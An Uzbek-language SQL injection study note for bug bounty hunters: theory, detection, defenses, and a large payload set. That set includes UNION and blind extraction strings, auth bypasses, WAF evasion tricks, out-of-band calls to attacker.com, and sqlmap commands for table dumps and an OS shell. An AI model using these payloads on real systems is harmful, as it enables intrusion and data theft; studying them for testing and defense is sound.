# SQL Injection (SQLi)

> Lab yechimlari (PortSwigger'ning 18 ta labi) → `LABS.md`. Bu fayl — to'liq nazariya + payload + tool.

## Nima bu? (tushuncha)
Ilova senga ko'rsatadigan ma'lumotni bazadan **SQL so'rov** yozib oladi. Masalan sen kategoriya
tanlasang, server shunaqa so'rov quradi:
```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```
Agar sen yozgan `Gifts` qiymati so'rovga **to'g'ridan-to'g'ri, filtrlanmay** qo'shilsa — sen SQL
sintaksisini buzib, o'z buyrug'ingni qo'shib yuborasan. Ya'ni dasturchi "bu joyga faqat kategoriya
nomi keladi" deb o'ylagan, sen esa o'sha joyga **butun boshli so'rov** tiqasan.

**Ildiz sabab:** ma'lumot (data) va buyruq (code) aralashib ketgan. Sen bergan matn "ma'lumot"
bo'lib qolmay, "kod" sifatida bajarilyapti. Yechim ham shu yerda — parametrlangan so'rov (data va
code'ni ajratish). Bu `AND released=1` ni `OR 1=1--` bilan aldashdan tortib, butun bazani
dump qilishgacha olib boradi.

## Qanday ishlaydi (minimal misol)
```
Kiritasan:  Gifts' OR 1=1--
So'rov:     SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
Natija:     OR 1=1 → doim rost → hamma qator (yashirin mahsulotlar ham). -- qolganini komment qiladi.
```

## Turlari

### 1. Kontekst bo'yicha (payload qayerga tushadi)
- **WHERE clause** — eng ko'p uchraydi (`?id=1`, filtr, qidiruv).
- **INSERT/UPDATE** — ro'yxatdan o'tish, profil yangilash (`VALUES (...)`).
- **ORDER BY / LIMIT** — tirnoq ishlamaydi, ustun raqami/ifoda inject qilinadi.
- **Table/column name** — allowlist kerak joy; `'` yordam bermaydi.
- **Header/Cookie ichida** — `User-Agent`, `Referer`, `X-Forwarded-For`, `TrackingId` cookie.

### 2. Natijani olish usuli bo'yicha (ENG MUHIM taksonomiya)
| Tur | Qachon | Qisqa mohiyat |
|-----|--------|----------------|
| **In-band: UNION-based** | Javob ekranga chiqadi | `UNION SELECT` bilan boshqa jadval ma'lumotini qo'shib chiqarasan |
| **In-band: Error-based** | Verbose xato ko'rinadi | Ma'lumotni DB xato matniga majburan chiqarasan (CAST, extractvalue) |
| **Blind: Boolean-based** | Javob rost/yolg'onga qarab o'zgaradi | Harfma-harf: shart rostmi? → sahifa o'zgaradi |
| **Blind: Time-based** | Javob ham, xato ham yo'q | `SLEEP`/`pg_sleep` — rost bo'lsa server kechikadi |
| **Out-of-band (OOB)** | Hech narsa qaytmaydi | DNS/HTTP orqali ma'lumotni tashqariga (Collaborator) jo'natasan |

> "Blind" = ma'lumot to'g'ridan ko'rinmaydi, bilvosita (javob farqi / vaqt / OOB) chiqarasan.
> Qiyinlik: UNION < Error < Boolean < Time < OOB. Lekin payment ham shunga qarab oshadi.

### 3. DBMS bo'yicha (sintaksis farq qiladi)
- **MySQL/MariaDB**: komment `-- ` yoki `#`, `SLEEP()`, `@@version`, `information_schema`.
- **PostgreSQL**: `||` concat, `pg_sleep()`, `CAST(... AS int)`, `version()`.
- **Microsoft SQL Server**: `WAITFOR DELAY`, `@@version`, `xp_cmdshell` (RCE).
- **Oracle**: har SELECT'ga `FROM dual`, `BANNER FROM v$version`, `all_tables`.

## Oqibatlar (IMPACT) — nega bu og'ir
- **Butun bazani dump qilish**: userlar, parol hashlar, email, karta, token. → ma'lumot buzilishi.
- **Autentifikatsiya bypass**: `admin'--` bilan parolsiz admin bo'lib kirish → account takeover.
- **Ma'lumotni o'zgartirish/o'chirish**: balans, rol, buyurtma, status (INSERT/UPDATE/DELETE).
- **Fayl o'qish/yozish**: MySQL `LOAD_FILE('/etc/passwd')`, `INTO OUTFILE` webshell.
- **Remote Code Execution (RCE)**: MSSQL `xp_cmdshell`, PostgreSQL `COPY ... TO PROGRAM`,
  MySQL UDF — ya'ni serverda operatsion tizim buyrug'i.
- **Lateral movement**: DB ichidagi config/secret → boshqa servislarga kirish.
> Qisqasi: SQLi odatda **Critical** (CVSS 9+). Eng og'ir web zaifliklaridan biri.

## Qayerdan qidiriladi
URL param (`?id=1`), POST body, JSON field, header'lar (`User-Agent`, `Referer`,
`X-Forwarded-For`, `Cookie`), `ORDER BY`/`LIMIT`, qidiruv, filtr, sort, login forma, REST path.

## Aniqlash
```sql
-- Sinov belgilari (xato chiqsa yoki javob o'zgarsa — bor)
'  "  ')  `)  '--  1'"

-- Boolean: javob o'zgarishini ushla
?id=1' AND '1'='1     -- true  → sahifa normal
?id=1' AND '1'='2     -- false → sahifa boshqacha

-- Raqamli kontekst
?id=2-1               -- id=1 ni bersa → SQLi aniq

-- Time-based (javob kechiksa — bor)
?id=1' AND SLEEP(5)-- -                      -- MySQL
?id=1'; WAITFOR DELAY '0:0:5'-- -            -- MSSQL
?id=1' AND pg_sleep(5)-- -                   -- PostgreSQL
```

## Turlari + payload

### UNION-based (ekranga ma'lumot chiqadigan)
```sql
' ORDER BY 1-- -          -- ustun sonini top (oshirib bor, xato chiqguncha)
' UNION SELECT NULL,NULL,NULL-- -          -- shuncha NULL bo'lishi kerak
' UNION SELECT username,password,NULL FROM users-- -
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables-- -
' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'-- -
```

### Error-based (xato ichida ma'lumot)
```sql
' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -   -- MySQL
' AND 1=CONVERT(int,(SELECT @@version))-- -                 -- MSSQL
' AND 1=CAST((SELECT version()) AS int)-- -                 -- PostgreSQL
```

### Blind Boolean
```sql
' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'-- -
```

### Blind Time-based
```sql
' AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a',SLEEP(3),0)-- -
```

### OOB (javob chiqmasa — tashqariga)
```sql
'; exec master..xp_dirtree '\\attacker.com\a'-- -           -- MSSQL DNS
' UNION SELECT UTL_HTTP.REQUEST('http://x.attacker.com') FROM dual-- -  -- Oracle
```

## Auth bypass payloadlari
```sql
admin'-- -
admin'#
' OR 1=1-- -
' OR '1'='1
') OR ('1'='1
admin') OR ('1'='1'-- -
```

## WAF bypass
```sql
UN/**/ION SE/**/LECT              -- comment bilan bo'lish
/*!50000UNION*//*!50000SELECT*/   -- MySQL inline comment
UnIoN SeLeCt                       -- katta-kichik aralash
UNION(SELECT(1),(2))               -- probelsiz, qavs bilan
UNION%09SELECT                     -- tab (%09), newline (%0a)
UNIunionON SELselectECT            -- keyword dubl (filtr bir marta o'chirsa)
0x61646d696e                       -- 'admin' hex
char(83,69,76)                     -- SELECT ni char bilan
%2527                              -- double URL encode: '
AND 1 like 1                       -- = o'rniga like/rlike/regexp
SELECT(column)FROM(table)          -- probel o'rniga qavs
```

## TOOLLAR

### sqlmap — SQLi'ning podshosi
```bash
sqlmap -u "https://target.com/item?id=1" --batch --dbs
```
> Parametrni avtomat sinab, zaif bo'lsa bazalar ro'yxatini chiqaradi. `--batch` savol so'ramaydi.

```bash
sqlmap -r request.txt --batch --level 5 --risk 3
```
> Burp'dan saqlangan request faylini o'qiydi — header, cookie, POST hammasi ichida. `level/risk` chuqurlikni oshiradi.

```bash
sqlmap -u "URL" --cookie="id=1*" --level 2
```
> `*` qo'ygan joyingni (cookie ichi) injection nuqtasi deb sinaydi.

```bash
sqlmap -u "URL" --tamper=space2comment,between,randomcase --random-agent
```
> WAF oldida — payloadni comment/randomcase bilan niqoblaydi, User-Agent'ni ham o'zgartiradi.

```bash
sqlmap -u "URL" -D shopdb -T users --dump
```
> Aniq baza va jadvalni to'liq tortib oladi (PoC uchun version/user yetadi, hammasini dump qilma).

```bash
sqlmap -u "URL" --os-shell
```
> Ruxsat bo'lsa server shell'i beradi (RCE). BBP'da ehtiyot bo'l, destruktiv ish qilma.

### ghauri — sqlmap alternativi (ba'zan WAF'ni yaxshiroq yoradi)
```bash
ghauri -u "https://target.com/item?id=1" --dbs --batch
```
> Blind/time-based'da sqlmap ko'rmagan joyni ko'rsatadi, tezroq.

### nuclei — ommaviy SQLi skani
```bash
cat params_urls.txt | nuclei -t ~/nuclei-templates/http/vulnerabilities/ -tags sqli
```
> Ko'p URL'ni bir yo'la tayyor shablon bilan tekshiradi — birinchi filtr sifatida.

### gf + qsreplace — target tayyorlash
```bash
cat all_urls.txt | gf sqli | qsreplace "' OR SLEEP(5)-- -" | while read u; do echo "$u"; done
```
> SQLi-potensial URL'larga time-based payload joylab, qaysi biri kechikadi — shuni ushlaysan.

## PoC
Parametr + payload, boolean/time farqini video/screenshot, `version()`/`current_user`
natijasi. Real sensitive data'ni dump qilma — borligini isbotla, nusxa olma.

## Himoya (reportda yoz)
Parametrlangan so'rov (prepared statement) — asosiy. ORM to'g'ri ishlat, input allowlist,
least-privilege DB user, WAF faqat qo'shimcha.

## Chain
SQLi → fayl o'qish → config/secret → boshqa servis. Yoki SQLi → `INTO OUTFILE` webshell → RCE.
Yoki SQLi → auth bypass → admin panel → to'liq egallash.
